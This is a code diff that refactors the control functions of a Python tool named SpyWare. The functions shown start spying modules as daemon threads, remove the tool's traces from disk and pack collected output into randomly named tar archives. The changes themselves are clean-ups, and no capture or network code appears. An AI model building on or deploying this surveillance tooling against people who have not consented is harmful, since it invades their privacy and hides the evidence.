@@ -183,9 +183,7 @@ def spy(modules: Dict[str, str]) -> int:
     This function starts spy modules and stop it on KeyboardInterrupt.
     """
 
-    EXITCODE = 0
-    namespace = globals().copy()
-    namespace.update(locals())
+    namespace = globals() | locals()
     threads = []
     daemons = []
 
@@ -204,15 +202,11 @@ def spy(modules: Dict[str, str]) -> int:
             thread.start()
 
             thread = Thread(target=daemon.run_AppData)
-            thread.daemon = True
-            threads.append(thread)
-            thread.start()
         else:
             thread = Thread(target=daemon.run_for_ever)
-            thread.daemon = True
-            threads.append(thread)
-            thread.start()
-
+        thread.daemon = True
+        threads.append(thread)
+        thread.start()
     try:
         join_all(*threads)
     except KeyboardInterrupt:
@@ -220,7 +214,7 @@ def spy(modules: Dict[str, str]) -> int:
     finally:
         join_all(*threads)
 
-    return EXITCODE
+    return 0
 
 
 def env(keyvalue: str) -> None:
@@ -465,8 +459,7 @@ def remove_trace(modules: Dict[str, str] = modules) -> None:
     This function removes trace of SpyWare.
     """
 
-    namespace = globals().copy()
-    namespace.update(locals())
+    namespace = globals() | locals()
     executable_dir = dirname(argv[0])
 
     if glob(join(executable_dir, "*/*.py")):
@@ -502,9 +495,7 @@ def archive(modules: Dict[str, str] = modules, mode: str = "") -> str:
     name = choices(ascii_letters + digits, k=choice(range(1, 15)))
     filename = f"archive_{name}.tar" + f".{mode}" if mode else mode
 
-    namespace = globals().copy()
-    namespace.update(locals())
-
+    namespace = globals() | locals()
     with tar_open(filename, f"w:{mode}") as file:
 
         for module in modules:
@@ -554,11 +545,10 @@ def get_modules(arguments: Namespace) -> Dict[str, str]:
         active_modules = {}
 
     for module, config in modules_config.items():
-        if is_mode_donotrun:
-            if config is not None:
+        if config is not None:
+            if is_mode_donotrun:
                 del modules_copy[module]
-        else:
-            if config is not None:
+            else:
                 active_modules[module] = config
 
     return modules_copy if is_mode_donotrun else active_modules
@@ -588,15 +578,7 @@ def main() -> int:
     elif tar is not None:
         register(archive, active_modules, tar)
 
-    EXITCODE = spy(active_modules)
-
-    # tar = arguments.tar
-    # if arguments.remove:
-    #     remove_trace(active_modules)
-    # elif tar is not None:
-    #     archive(active_modules, tar)
-
-    return EXITCODE
+    return spy(active_modules)
 
 
 if __name__ == "__main__":
